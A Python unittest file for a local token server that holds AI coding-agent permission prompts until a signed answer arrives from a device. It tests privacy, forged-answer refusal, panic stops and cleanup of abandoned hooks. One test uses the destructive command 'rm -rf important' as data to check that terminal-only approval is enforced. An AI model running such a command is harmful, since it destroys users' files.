        self.store.park("question", question_event(), 300)
        self.assertEqual(self.store.pending_public()["request_id"],
                         first.request_id)

    def test_panic_stop_denies_everything_parked(self):
        entries = [self.store.park("approval", approval_event(), 300),
                   self.store.park("question", question_event(), 300)]
        self.assertEqual(self.store.deny_all(), 2)
        self.assertIsNone(self.store.pending_public())
        for entry in entries:
            body = self.store.await_verdict(entry)
            self.assertIsNotNone(body)  # panic denies, it does not punt

    def test_a_held_hook_really_blocks_until_answered(self):
        entry = self.store.park("approval", approval_event(), 300)
        result = {}

        def hook_thread():
            result["body"] = self.store.await_verdict(entry)

        thread = threading.Thread(target=hook_thread)
        thread.start()
        thread.join(timeout=0.2)
        self.assertTrue(thread.is_alive(), "hook returned before an answer")
        self.answer(entry.request_id, "approve")
        thread.join(timeout=2)
        self.assertFalse(thread.is_alive())
        self.assertEqual(
            result["body"]["hookSpecificOutput"]["decision"]["behavior"],
            "allow")

    def test_answers_are_refused_when_no_secret_is_configured(self):
        store = InteractionStore(secret="", reveal_detail=True,
                                 now=self.clock, wall=self.wall)
        entry = store.park("approval", approval_event(), 120)
        stamp = int(self.wall())
        ok, reason = store.resolve(entry.request_id, "approve", stamp,
                                   sign_answer(SECRET, entry.request_id,
                                               "approve", stamp))
        self.assertFalse(ok)
        self.assertIn("not configured", reason)


class RelayStoreListenerTests(unittest.TestCase):
    class Listener:
        def __init__(self, store, fail=False):
            self.store = store
            self.fail = fail
            self.parked = []
            self.removed = []

        def _assert_unlocked(self):
            acquired = self.store._lock.acquire(blocking=False)
            if acquired:
                self.store._lock.release()
            if not acquired:
                raise AssertionError("listener invoked under store lock")

        def on_park(self, job):
            self._assert_unlocked()
            self.store.pending_public()
            if self.fail:
                raise RuntimeError("listener failure")
            self.parked.append(job)

        def on_remove(self, request_id, reason):
            self._assert_unlocked()
            if self.fail:
                raise RuntimeError("listener failure")
            self.removed.append((request_id, reason))

    def setUp(self):
        self.clock = Clock()
        self.wall = Clock(50_000.0)
        self.store = InteractionStore(
            secret=SECRET, reveal_detail=True, now=self.clock,
            wall=self.wall,
            relay_random_bytes=lambda size: b"\x42" * size,
        )
        self.listener = self.Listener(self.store)
        self.store.set_relay_listener(self.listener)

    def test_park_emits_only_an_immutable_bounded_public_job(self):
        event = approval_event(command="npm test")
        event["session_id"] = "secret-session"
        event["transcript_path"] = "/private/transcript.jsonl"

        entry = self.store.park("approval", event, 30)

        self.assertIsNotNone(entry)
        self.assertEqual(len(self.listener.parked), 1)
        job = self.listener.parked[0]
        self.assertEqual(set(job.__dataclass_fields__), {
            "request_id", "challenge", "view_bytes", "view_sha256",
            "expires_at", "provider", "can_approve",
        })
        self.assertEqual(job.request_id, entry.request_id)
        self.assertEqual(job.challenge, b"\x42" * 32)
        self.assertEqual(job.provider, "claude")
        self.assertTrue(job.can_approve)
        self.assertLessEqual(len(job.view_bytes),
                             interactions.PENDING_BUDGET_BYTES)
        self.assertEqual(
            job.view_sha256,
            hashlib.sha256(job.view_bytes).digest(),
        )
        decoded = json.loads(job.view_bytes.decode("utf-8"))
        self.assertEqual(decoded["title"], "npm test")
        self.assertNotIn("session_id", decoded)
        self.assertNotIn("transcript_path", decoded)
        self.assertNotIn("secret-session", repr(job))
        self.assertNotIn("transcript.jsonl", repr(job))
        with self.assertRaises((AttributeError, TypeError)):
            job.provider = "codex"

    def test_listener_failure_never_breaks_parking_or_resolution(self):
        self.store.set_relay_listener(self.Listener(self.store, fail=True))
        entry = self.store.park("approval", approval_event(), 30)
        self.assertIsNotNone(entry)

        stamp = int(self.wall())
        mac = interactions.sign_answer_v2(
            SECRET, "claude", entry.request_id, entry.view_sha256,
            "deny", stamp)
        self.assertEqual(self.store.resolve(
            entry.request_id, "deny", stamp, mac, provider="claude",
            view_sha256=entry.view_sha256), (True, "ok"))
        self.assertEqual(self.store.await_result(entry).verdict, "deny")

    def test_direct_timeout_dead_hook_and_panic_emit_remote_removal(self):
        direct = self.store.park("approval", approval_event(), 30)
        stamp = int(self.wall())
        mac = interactions.sign_answer_v2(
            SECRET, "claude", direct.request_id, direct.view_sha256,
            "deny", stamp)
        self.assertEqual(self.store.resolve(
            direct.request_id, "deny", stamp, mac, provider="claude",
            view_sha256=direct.view_sha256), (True, "ok"))

        expired = self.store.park("approval", approval_event(), 1)
        self.clock.advance(2)
        self.store.pending_public()

        abandoned = self.store.park("approval", approval_event(), 30)
        original_poll = interactions.ALIVE_POLL_S
        interactions.ALIVE_POLL_S = 0
        try:
            self.assertIsNone(self.store.await_result(
                abandoned, is_alive=lambda: False))
        finally:
            interactions.ALIVE_POLL_S = original_poll

        panic_a = self.store.park("approval", approval_event(), 30)
        panic_b = self.store.park("question", question_event(), 30)
        self.assertEqual(self.store.deny_all(), 2)

        self.assertCountEqual(self.listener.removed, [
            (direct.request_id, "resolved"),
            (expired.request_id, "timeout"),
            (abandoned.request_id, "abandoned"),
            (panic_a.request_id, "panic"),
            (panic_b.request_id, "panic"),
        ])

    def _relay_verdict(self, entry, verdict="approve", **changes):
        job = entry.relay_job
        value = interactions.RelayResolution(
            request_id=entry.request_id,
            challenge=job.challenge,
            view_sha256=job.view_sha256,
            verdict=verdict,
            mac=b"\x99" * 32,
        )
        return replace(value, **changes)

    def test_relay_resolution_checks_binding_deadline_consumption_and_policy(self):
        entry = self.store.park("approval", approval_event(), 30)
        verifier_calls = []

        def verifier(job, verdict):
            self.assertFalse(self.store._lock.acquire(blocking=False))
            verifier_calls.append((job, verdict))
            return True

        wrong_challenge = self._relay_verdict(
            entry, challenge=b"\x43" * 32)
        self.assertEqual(self.store.resolve_relay(
            wrong_challenge, verifier), (False, "interaction binding rejected"))
        wrong_digest = self._relay_verdict(
            entry, view_sha256=b"\x44" * 32)
        self.assertEqual(self.store.resolve_relay(
            wrong_digest, verifier), (False, "interaction binding rejected"))
        self.assertEqual(verifier_calls, [])

        accepted = self._relay_verdict(entry)
        self.assertEqual(self.store.resolve_relay(
            accepted, verifier), (True, "ok"))
        self.assertEqual(len(verifier_calls), 1)
        self.assertEqual(self.store.resolve_relay(
            accepted, verifier), (False, "no such pending interaction"))
        self.assertEqual(self.store.await_result(entry).verdict, "approve")

        private_event = approval_event(command="rm -rf important")
        private = self.store.park("approval", private_event, 30)
        self.assertFalse(private.relay_job.can_approve)
        self.assertEqual(self.store.resolve_relay(
            self._relay_verdict(private), verifier),
            (False, "this one has to be approved at the terminal"))

        expired = self.store.park("approval", approval_event(), 1)
        self.clock.advance(2)
        self.assertEqual(self.store.resolve_relay(
            self._relay_verdict(expired, verdict="deny"), verifier),
            (False, "no such pending interaction"))

    def test_terminal_and_authenticated_panic_are_anchored(self):
        terminal = self.store.park("approval", approval_event(), 30)
        self.assertEqual(self.store.resolve_relay(
            self._relay_verdict(terminal, verdict="terminal"),
            lambda _job, _verdict: True), (True, "ok"))
        self.assertEqual(self.store.await_result(terminal).verdict, "leave_it")

        anchor = self.store.park("approval", approval_event(), 30)
        other = self.store.park("question", question_event(), 30)
        self.assertEqual(self.store.resolve_relay(
            self._relay_verdict(anchor, verdict="panic"),
            lambda _job, _verdict: True), (True, "panic"))
        self.assertEqual(self.store.await_result(anchor).verdict, "deny")
        self.assertEqual(self.store.await_result(other).verdict, "deny")
        self.assertIsNone(self.store.pending_public())

    def test_concurrent_direct_and_relay_answers_consume_exactly_once(self):
        for _ in range(40):
            entry = self.store.park("approval", approval_event(), 30)
            relay_result = self._relay_verdict(entry, verdict="approve")
            stamp = int(self.wall())
            direct_mac = interactions.sign_answer_v2(
                SECRET, "claude", entry.request_id, entry.view_sha256,
                "deny", stamp)
            barrier = threading.Barrier(3)
            results = []

            def direct():
                barrier.wait()
                results.append(self.store.resolve(
                    entry.request_id, "deny", stamp, direct_mac,
                    provider="claude", view_sha256=entry.view_sha256))

            def relayed():
                barrier.wait()
                results.append(self.store.resolve_relay(
                    relay_result, lambda _job, _result: True))

            threads = [threading.Thread(target=direct),
                       threading.Thread(target=relayed)]
            for thread in threads:
                thread.start()
            barrier.wait()
            for thread in threads:
                thread.join(timeout=1)
                self.assertFalse(thread.is_alive())

            self.assertEqual(sum(accepted for accepted, _reason in results), 1)
            self.assertIn(
                self.store.await_result(entry).verdict, ("approve", "deny"))
            self.assertIsNone(self.store.pending_public())


class PrivacyTests(unittest.TestCase):
    def setUp(self):
        self.store = InteractionStore(secret=SECRET, reveal_detail=False,
                                      now=Clock(), wall=Clock(50_000.0))

    def test_content_stays_on_the_mac_by_default(self):
        self.store.park("approval", approval_event("npm test"), 120)
        public = self.store.pending_public()
        body = json.dumps(public)
        self.assertNotIn("npm test", body)
        self.assertNotIn("Run the tests", body)
        self.assertFalse(public["can_approve"])
        # you still learn that something waits, and where
        self.assertEqual(public["kind"], "approval")
        self.assertEqual(public["project"], "vibepulse")

    def test_question_text_stays_on_the_mac_by_default(self):
        self.store.park("question", question_event(), 120)
        body = json.dumps(self.store.pending_public())
        self.assertNotIn("Which auth approach?", body)
        self.assertNotIn("New auth layer", body)

    def test_project_is_a_basename_never_a_path(self):
        event = approval_event()
        event["cwd"] = "/Users/niclas/secret-client-work/vibepulse"
        self.store.park("approval", event, 120)
        body = json.dumps(self.store.pending_public())
        self.assertNotIn("secret-client-work", body)
        self.assertNotIn("/Users", body)

    def test_session_id_is_never_published(self):
        self.store.park("approval", approval_event(), 120)
        self.assertNotIn("e8a3c2d1",
                         json.dumps(self.store.pending_public()))


class DeviceBudgetTests(unittest.TestCase):
    """The firmware drops the WHOLE body over 4096 bytes, so the new optional
    field must never be what pushes it there."""

    def test_pending_payload_stays_within_its_budget(self):
        store = InteractionStore(secret=SECRET, reveal_detail=True,
                                 now=Clock(), wall=Clock(50_000.0))
        store.park("approval", approval_event("npm test -- " + "x" * 400),
                   120)
        encoded = len(json.dumps(store.pending_public()).encode())
        self.assertLessEqual(encoded, interactions.PENDING_BUDGET_BYTES)

    def test_response_ceiling_leaves_room_under_the_firmware_cap(self):
        self.assertLess(interactions.RESPONSE_CEILING_BYTES, 4096)
        self.assertTrue(response_fits({"v": 2, "seq": 1, "agents": {}}))
        self.assertFalse(response_fits({"pad": "x" * 4000}))

    def test_a_full_snapshot_plus_pending_still_fits(self):
        store = InteractionStore(secret=SECRET, reveal_detail=True,
                                 now=Clock(), wall=Clock(50_000.0))
        store.park("question", question_event(), 120)
        jobs = [{"task_id": "b" * 64, "event_id": "c" * 32,
                 "state": "waiting", "project": "vibepulse",
                 "activity": "waiting_input", "model": "OPUS 5",
                 "effort": "ULTRA", "updated_ms": 1234}
                for _ in range(4)]
        snapshot = {"v": 2, "seq": 9,
                    "agents": {"claude": {"active_count": 4, "jobs": jobs},
                               "codex": {"active_count": 4, "jobs": jobs}},
                    "pending": store.pending_public()}
        self.assertTrue(response_fits(snapshot),
                        f"{len(json.dumps(snapshot).encode())} bytes")


class AbandonedHookTests(unittest.TestCase):
    """The reviewer's finding: a hook whose client hung up must not sit
    parked until timeout, shadowing real prompts and eating queue slots."""

    def setUp(self):
        self.store = InteractionStore(secret=SECRET, reveal_detail=True)

    def test_dead_client_frees_its_slot_immediately(self):
        entry = self.store.park("approval", approval_event(), 600)
        started = time.monotonic()
        body = self.store.await_verdict(entry, is_alive=lambda: False)
        self.assertIsNone(body)  # abandoned = no decision, same as timeout
        self.assertLess(time.monotonic() - started,
                        interactions.ALIVE_POLL_S + 2)
        self.assertIsNone(self.store.pending_public())

    def test_ghost_does_not_shadow_a_live_prompt(self):
        ghost = self.store.park("approval", approval_event(), 600)
        live = self.store.park("question", question_event(), 600)
        # oldest-first: while the ghost is parked, it is the one on screen
        self.assertEqual(self.store.pending_public()["request_id"],
                         ghost.request_id)
        self.store.await_verdict(ghost, is_alive=lambda: False)
        # the moment it is reaped, the live one surfaces
        self.assertEqual(self.store.pending_public()["request_id"],
                         live.request_id)
        self.store.deny_all()

    def test_equal_clock_ticks_still_preserve_arrival_order(self):
        random_values = iter((b"\xff" * 16, b"\x00" * 16))
        store = InteractionStore(
            secret=SECRET,
            reveal_detail=True,
            now=Clock(),
            random_bytes=lambda size: next(random_values),
        )

        first = store.park("approval", approval_event(), 600)
        second = store.park("question", question_event(), 600)

        # Windows' monotonic clock can return the same value for consecutive
        # parks. A random request ID must never become the queue tie-breaker.
        self.assertGreater(first.request_id, second.request_id)
        self.assertEqual(store.pending_public()["request_id"],
                         first.request_id)
        store.deny_all()

    def test_zombies_no_longer_fill_the_queue(self):
        for _ in range(interactions.MAX_PENDING):
            zombie = self.store.park("approval", approval_event(), 600)
            self.store.await_verdict(zombie, is_alive=lambda: False)
        # every slot was reclaimed, so a real hook still parks
        self.assertIsNotNone(
            self.store.park("approval", approval_event(), 600))
        self.store.deny_all()

    def test_alive_client_still_gets_its_answer(self):
        entry = self.store.park("approval", approval_event(), 600)
        result = {}

        def hook():
            result["body"] = self.store.await_verdict(
                entry, is_alive=lambda: True)

        thread = threading.Thread(target=hook, daemon=True)
        thread.start()
        time.sleep(0.05)
        stamp = int(time.time())
        mac = interactions.sign_answer_v2(
            SECRET, "claude", entry.request_id, entry.view_sha256,
            "approve", stamp)
        ok, _ = self.store.resolve(
            entry.request_id, "approve", stamp, mac, provider="claude",
            view_sha256=entry.view_sha256)
        self.assertTrue(ok)
        thread.join(timeout=5)
        self.assertEqual(
            result["body"]["hookSpecificOutput"]["decision"]["behavior"],
            "allow")

    def test_client_dying_mid_wait_is_noticed_within_the_poll_bound(self):
        entry = self.store.park("approval", approval_event(), 600)
        died_at = time.monotonic() + 0.2
        started = time.monotonic()
        body = self.store.await_verdict(
            entry, is_alive=lambda: time.monotonic() < died_at)
        self.assertIsNone(body)
        self.assertLess(time.monotonic() - started,
                        0.2 + interactions.ALIVE_POLL_S + 2)


class RealClockTests(unittest.TestCase):
    def test_default_clocks_expire_a_short_hold(self):
        store = InteractionStore(secret=SECRET, reveal_detail=True)
        entry = store.park("approval", approval_event(), 1)
        started = time.monotonic()
        self.assertIsNone(store.await_verdict(entry))
        self.assertLess(time.monotonic() - started, 5)


class StubAgentStatus:
    def snapshot(self):
        return {"v": 2, "seq": 3,
                "agents": {"claude": {"active_count": 1, "jobs": []},
                           "codex": {"active_count": 0, "jobs": []}}}


class HttpEndToEndTests(unittest.TestCase):
    """The wire itself: a parked hook really holds its connection, and one
    signed tap really releases it with the right body."""

    def setUp(self):
        from tools.tokenserver import tokenserver as server_module
        self.module = server_module
        self.handler = server_module.Handler
        self._saved = {
            "store": self.handler.interaction_store,
            "timeout": self.handler.interaction_timeout_s,
            "agent_status": self.handler.agent_status,
            "claude": self.handler.claude_interactions,
            "legacy_claude_panel_v1": getattr(
                self.handler, "legacy_claude_panel_v1", False),
        }
        self.store = InteractionStore(secret=SECRET, reveal_detail=True)
        self.handler.interaction_store = self.store
        self.handler.interaction_timeout_s = 30.0
        self.handler.agent_status = StubAgentStatus()
        self.handler.claude_interactions = True
        self.handler.legacy_claude_panel_v1 = False
        self.server = server_module.BoundedThreadingHTTPServer(
            ("127.0.0.1", 0), self.handler)
        self.port = self.server.server_address[1]
        self.thread = threading.Thread(target=self.server.serve_forever,
                                       daemon=True)
        self.thread.start()

    def tearDown(self):
        self.server.shutdown()
        self.server.server_close()
        self.thread.join(timeout=5)
        self.handler.interaction_store = self._saved["store"]
        self.handler.interaction_timeout_s = self._saved["timeout"]
        self.handler.agent_status = self._saved["agent_status"]
        self.handler.claude_interactions = self._saved["claude"]
        self.handler.legacy_claude_panel_v1 = \
            self._saved["legacy_claude_panel_v1"]

    def request(self, method, path, payload=_NO_BODY, headers=None,
                early_reject=False):
        body = (None if payload is _NO_BODY else
                json.dumps(payload).encode())
        request_headers = ({"Content-Type": "application/json"}
                           if body else {})
        request_headers.update(headers or {})
        if body is not None and early_reject:
            # The route is expected to answer on the headers alone. Send
            # the body only if it does not, so the server never closes on
            # unread bytes (see headers_first_request).
            return headers_first_request(self.port, method, path, body,
                                         request_headers)
        conn = http.client.HTTPConnection("127.0.0.1", self.port, timeout=30)
        conn.request(method, path, body=body, headers=request_headers)
        response = conn.getresponse()
        raw = response.read()
        conn.close()
        return response.status, raw

    def raw_exchange(self, request, timeout=2.0):
        client = socket.create_connection(
            ("127.0.0.1", self.port), timeout=timeout)
        client.settimeout(timeout)
        try:
            client.sendall(request)
            response = http.client.HTTPResponse(client)
            response.begin()
            return response.status, response.read()
        finally:
            client.close()

    def pending(self):
        status, raw = self.request("GET", "/api/agent-status")
        self.assertEqual(status, 200)
        return json.loads(raw).get("pending")

    def wait_for_pending(self, timeout=10.0):
        deadline = time.monotonic() + timeout
        while time.monotonic() < deadline:
            found = self.pending()
            if found is not None:
                return found
            time.sleep(0.02)
        self.fail("the interaction never reached /api/agent-status")

    def answer(self, shown, verdict="approve"):
        request_id = shown["request_id"]
        stamp = int(time.time())
        mac = interactions.sign_answer_v2(
            SECRET, shown["provider"], request_id, shown["view_sha256"],
            verdict, stamp)
        return self.request("POST", f"/api/interaction/{request_id}", {
            "provider": shown["provider"],
            "view_sha256": shown["view_sha256"],
            "verdict": verdict, "ts": stamp, "hmac": mac})

    def test_question_travels_claude_to_device_to_claude(self):
        result = {}

        def hook():
            result["status"], result["raw"] = self.request(
                "POST", "/api/hook/question", question_event())

        thread = threading.Thread(target=hook, daemon=True)
        thread.start()

        shown = self.wait_for_pending()
        self.assertEqual(shown["kind"], "question")
        self.assertEqual(shown["title"], "New auth layer")
        self.assertEqual(shown["project"], "vibepulse")
        self.assertTrue(shown["can_approve"])

        # still blocked: this is the whole point of the design
        thread.join(timeout=0.3)
        self.assertTrue(thread.is_alive())

        status, raw = self.answer(shown)
        self.assertEqual(status, 200)
        self.assertTrue(json.loads(raw)["ok"])

        thread.join(timeout=10)
        self.assertFalse(thread.is_alive())
        self.assertEqual(result["status"], 200)
        body = json.loads(result["raw"])
        output = body["hookSpecificOutput"]
        self.assertEqual(output["permissionDecision"], "allow")
        self.assertEqual(output["updatedInput"]["answers"],
                         {"Which auth approach?":
                          "New auth layer (Recommended)"})
        self.assertIsNone(self.pending())

    def test_internal_question_permission_is_not_parked(self):
        question_result = {}

        def question_hook():
            question_result["status"], question_result["raw"] = self.request(
                "POST", "/api/hook/question", question_event())

        question_thread = threading.Thread(target=question_hook, daemon=True)
        question_thread.start()
        shown = self.wait_for_pending()

        duplicate = approval_event(tool="  AskUserQuestion  ")
        duplicate["tool_input"] = question_event()["tool_input"]
        duplicate_result = {}

        def duplicate_hook():
            duplicate_result["status"], duplicate_result["raw"] = \
                self.request("POST", "/api/hook/permission", duplicate)

        duplicate_thread = threading.Thread(target=duplicate_hook,
                                            daemon=True)
        duplicate_thread.start()
        duplicate_thread.join(timeout=0.3)
        duplicate_returned_promptly = not duplicate_thread.is_alive()
        still_shown = self.pending()
        with self.store._lock:
            pending_count = len(self.store._pending)

        self.answer(shown, "deny")
        question_thread.join(timeout=5)
        if duplicate_thread.is_alive():
            self.store.deny_all()
            duplicate_thread.join(timeout=5)

        self.assertTrue(duplicate_returned_promptly)
        self.assertEqual(duplicate_result, {"status": 200, "raw": b""})
        self.assertEqual(still_shown["request_id"], shown["request_id"])
        self.assertEqual(pending_count, 1)
        self.assertFalse(question_thread.is_alive())
        self.assertFalse(duplicate_thread.is_alive())
        self.assertEqual(question_result["status"], 200)
        self.assertEqual(
            json.loads(question_result["raw"])["hookSpecificOutput"]
            ["permissionDecision"], "deny")

    def test_approval_allow_travels_end_to_end(self):
        result = {}

        def hook():
            result["raw"] = self.request(
                "POST", "/api/hook/permission", approval_event())[1]

        thread = threading.Thread(target=hook, daemon=True)
        thread.start()
        shown = self.wait_for_pending()
        self.assertEqual(shown["kind"], "approval")
        self.assertEqual(shown["title"], "npm test")
        self.answer(shown, "approve")
        thread.join(timeout=10)
        self.assertEqual(
            json.loads(result["raw"])["hookSpecificOutput"]["decision"],
            {"behavior": "allow"})

    def test_explicit_legacy_claude_mode_uses_v1_only_for_claude(self):
        self.handler.legacy_claude_panel_v1 = True
        result = {}

        def hook():
            result["status"], result["raw"] = self.request(
                "POST", "/api/hook/permission", approval_event())

        thread = threading.Thread(target=hook, daemon=True)
        thread.start()
        shown = self.wait_for_pending()
        self.assertNotIn("provider", shown)
        self.assertNotIn("view_sha256", shown)
        stamp = int(time.time())
        mac = sign_answer(
            SECRET, shown["request_id"], "approve", stamp)

        status, raw = self.request(
            "POST", f"/api/interaction/{shown['request_id']}", {
                "verdict": "approve", "ts": stamp, "hmac": mac,
            })

        self.assertEqual(status, 200, raw)
        thread.join(timeout=10)
        self.assertFalse(thread.is_alive())
        self.assertEqual(result["status"], 200)
        self.assertEqual(
            json.loads(result["raw"])["hookSpecificOutput"]["decision"],
            {"behavior": "allow"})

    def test_timeout_returns_an_empty_body_so_the_terminal_asks(self):
        self.handler.interaction_timeout_s = 1.0
        started = time.monotonic()
        status, raw = self.request("POST", "/api/hook/permission",
                                   approval_event())
        self.assertEqual(status, 200)
        self.assertEqual(raw, b"")  # no decision — Claude Code prompts
        self.assertLess(time.monotonic() - started, 15)

    def test_unrenderable_payload_returns_immediately_with_no_decision(self):
        payload = question_event()
        payload["tool_input"]["questions"].append({"question": "second"})
        started = time.monotonic()
        status, raw = self.request("POST", "/api/hook/question", payload)
        self.assertEqual((status, raw), (200, b""))
        self.assertLess(time.monotonic() - started, 5)

    def test_garbage_hook_bodies_never_hang_or_crash(self):
        for payload in (None, [], "nope", {"tool_input": 5}):
            status, raw = self.request("POST", "/api/hook/question", payload)
            self.assertEqual((status, raw), (200, b""), payload)

    def test_panic_stop_denies_what_is_parked(self):
        result = {}

        def hook():
            result["raw"] = self.request(
                "POST", "/api/hook/permission", approval_event())[1]

        thread = threading.Thread(target=hook, daemon=True)
        thread.start()
        self.wait_for_pending()
        stamp = int(time.time())
        status, raw = self.request("POST", "/api/panic", {
            "ts": stamp, "hmac": sign_answer(SECRET, "panic", "deny", stamp)})
        self.assertEqual(status, 200)
        self.assertEqual(json.loads(raw)["denied"], 1)
        thread.join(timeout=10)
        self.assertEqual(
            json.loads(result["raw"])["hookSpecificOutput"]["decision"]
            ["behavior"], "deny")

    def test_unsigned_panic_is_refused(self):
        status, _ = self.request("POST", "/api/panic",
                                 {"ts": int(time.time()), "hmac": "0" * 64})
        self.assertEqual(status, 409)

    def test_forged_answer_is_refused_and_leaves_it_pending(self):
        thread = threading.Thread(
            target=lambda: self.request("POST", "/api/hook/permission",
                                        approval_event()), daemon=True)
        thread.start()
        shown = self.wait_for_pending()
        status, raw = self.request(
            "POST", f"/api/interaction/{shown['request_id']}",
            {"verdict": "approve", "ts": int(time.time()), "hmac": "0" * 64})
        self.assertEqual(status, 409)
        self.assertFalse(json.loads(raw)["ok"])
        self.assertIsNotNone(self.pending())
        self.store.deny_all()
        thread.join(timeout=10)

    def test_abandoned_connection_is_reaped_well_before_timeout(self):
        """The reviewer's observation, at the wire: POST a hook, hang up,
        and the ghost must leave /api/agent-status within the poll bound —
        not at the 30 s timeout."""
        import socket as socket_module
        from tools.tokenserver import interactions as interactions_module

        raw = json.dumps(approval_event()).encode()
        client = socket_module.create_connection(("127.0.0.1", self.port),
                                                 timeout=5)
        client.sendall(
            b"POST /api/hook/permission HTTP/1.1\r\n"
            b"Host: 127.0.0.1\r\n"
            b"Content-Type: application/json\r\n"
            b"Content-Length: " + str(len(raw)).encode() + b"\r\n"
            b"\r\n" + raw)
        self.wait_for_pending()
        client.close()  # the session died: Ctrl-C, closed terminal

        deadline = time.monotonic() + interactions_module.ALIVE_POLL_S + 5
        while time.monotonic() < deadline:
            if self.pending() is None:
                return
            time.sleep(0.1)
        self.fail("abandoned hook still parked after the poll bound")

    def test_agent_status_is_unchanged_when_nothing_is_pending(self):
        payload = json.loads(self.request("GET", "/api/agent-status")[1])
        self.assertNotIn("pending", payload)
        self.assertEqual(payload["v"], 2)  # the firmware pins this

    def test_post_is_404_when_interactions_are_off(self):
        self.handler.interaction_store = None
        status, _ = self.request("POST", "/api/hook/question",
                                 question_event(), early_reject=True)
        self.assertEqual(status, 404)

    def test_non_loopback_hooks_are_refused(self):
        handler = self.handler.__new__(self.handler)
        for host in ("192.168.1.20", "10.0.0.5", ""):
            handler.client_address = (host, 5000)
            self.assertFalse(handler._is_loopback(), host)
        for host in (
                "127.0.0.1", "127.42.7.9", "::1",
                "::ffff:127.42.7.9"):
            handler.client_address = (host, 5000)
            self.assertTrue(handler._is_loopback(), host)


if __name__ == "__main__":
    unittest.main(verbosity=2)
